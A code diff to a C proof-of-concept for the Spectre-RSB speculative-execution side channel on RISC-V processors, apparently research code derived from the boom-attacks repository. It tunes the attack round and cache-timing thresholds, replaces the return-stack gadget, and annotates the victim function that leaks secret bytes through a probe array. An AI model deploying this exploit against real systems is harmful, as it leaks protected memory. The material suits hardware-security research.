@@ -20,9 +20,10 @@
  */
 //#define TRAIN_TIMES 24 // (Spectre-RSB does not need trainning.) Times to train the predictor. There shall be an ideal value for each machine.
 // Note: smaller TRAIN_TIMES values increase misses or even cause failure, while larger ones unnecessarily take longer time.
-#define ATTACK_ROUNDS 40 // Times to attack the same index. Ideal to have larger ATTACK_ROUNDS (takes more time but statistically better).
+#define ATTACK_ROUNDS 50 // Times to attack the same index. Ideal to have larger ATTACK_ROUNDS (takes more time but statistically better).
 // For most processors with simple RAS(Return Address Stack), theoretically 1 will be enough for a successful Spectre-RSB attack.
-#define CACHE_HIT_THRESHOLD 47 // (37~57 for XuanTie C910) Interval smaller than CACHE_HIT_THRESHOLD will be deemed as "cache hit". Ideal to have lower CACHE_HIT_THRESHOLD (higher accuracy).
+#define CACHE_HIT_THRESHOLD 67 // Interval smaller than CACHE_HIT_THRESHOLD will be deemed as "cache hit". Ideal to have lower CACHE_HIT_THRESHOLD (higher accuracy).
+// Threshold for Spectre-RSB is quite different from others. It is much more sensitive which requires more manual tuning.
 // To keep results accurate, the larger TRAIN_TIMES and ATTACK_ROUNDS you have, the smaller CACHE_HIT_THRESHOLD shoud be.
 
 /* <<<<<< Mostly used parameters for debugging are listed above. <<<<<< */
@@ -78,16 +79,52 @@ uint8_t probeArray[ARRAY_SIZE_FACTOR * ARRAY_STRIDE]; // TBD: this placeHolder a
  /* Declare a global variable that prevents the compiler from optimizing out victimFunc(). */
 uint8_t anchorVar = 0;
 
-// Given an attack address, victimFunc reads in the attack array speculatively by bypassing the RSB.
-
+/** Given an attack address, victimFunc reads in the attack array speculatively by bypassing the RSB.
+  *
+  * Number (but not order) of lines of victimFunc matters in 2 aspects:
+  *
+  * 1. It determines changes made to "ra" (return address) and "sp" (stack pointer) values in the swStackGadget (software stack gadget) assembly codes.
+  * Specific explanations are given in comments of the following codes.
+  * Also see the following links for basic knowledge and references:
+  * Call stack layout: https://en.wikipedia.org/wiki/Call_stack
+  * (As this link has pointed out, while "parameters" and "return address" have shared parts, "locals" are distinct.)
+  * Stack-based memory allocation: https://en.wikipedia.org/wiki/Stack-based_memory_allocation
+  *
+  * 2. It may help extending the execution time ("speculation window"), though you can achieve it using other techiques.
+  * (e. g. increasing number of division operations for intentionally delaying purposes in the swStackGadget source code file.) 
+  *
+  */
+  
 /**
- * @input secAddr input to be used to idx the array
+ * @input secretAddr input to be used to idx the array
  */
 void victimFunc(uint64_t secretAddr){
 
-	extern void rasGadget();
-	rasGadget();
+
+//	This part forms the minimum requirements.
+//	Note that they should not be replaced with in-line assembly codes,
+//	since function calling is necessary.
+	extern void swStackGadget();
+	swStackGadget();
+
+//	The simplest and quickest way with least lines.
+//	Seems to be too fast that cause confusions inside data cache, though.
+//	swStackGadget values for this way: "ld ra, 24(sp)" and "addi sp, sp, 32".
 	anchorVar &= probeArray[(*((uint8_t*)secretAddr)) * ARRAY_STRIDE];
+
+//	This one is a slightly modified version.
+//	swStackGadget values for this way: "ld ra, 40(sp)" and "addi sp, sp, 48".
+//	uint64_t  junkVar = 0;
+//	uint8_t* secretIntermediate = (uint8_t*)secretAddr;
+//	anchorVar &= probeArray[*(secretIntermediate) * ARRAY_STRIDE];
+
+//	This way is identical to the original one from UCB boom-attacks repositoriy.
+//	Link: https://github.com/riscv-boom/boom-attacks/blob/master/src/returnStackBuffer.c
+//	swStackGadget values for this way: "ld ra, 56(sp)" and "addi sp, sp, 64".
+//	uint64_t  junkVar = 0;
+//	uint8_t* secretIntermediate = (uint8_t*)secretAddr;
+//	junkVar &= probeArray[*(secretIntermediate) * ARRAY_STRIDE];
+//	junkVar = READ_CSR(cycle);
 }
 
 // TBD: mix the order in other ways.
@@ -153,17 +190,18 @@ int main(void){
 		for(uint64_t atkRound = 0; atkRound < ATTACK_ROUNDS; atkRound++){
 			
 			// Make sure array you read from is not in the cache.
-			flushCache((uint64_t)secretString, sizeof(secretString));
+//			flushCache((uint64_t)secretString, sizeof(secretString));
 			flushCache((uint64_t)probeArray, sizeof(probeArray));
 
 			/* Delay (act as mfence, memory fence) */
-			// Set of constant takens to make the BHR be in a all taken state				
+			// Set of constant takens to make the BHB be in a all taken state				
 			for(volatile int k = 0; k < ARRAY_SIZE_FACTOR; k++){
 				asm("");
 			}
 				
 			victimFunc((uint64_t)secretString + len); 
-			
+			__asm__ volatile ("ld fp, -16(sp)");
+
 			// Read out probeArray and see the hit secret value.		
 			/* Time reads. Order is slightly mixed up to prevent stride prediction (prefetching). */
 			for (int i = 0; i < ARRAY_SIZE_FACTOR; i++) {
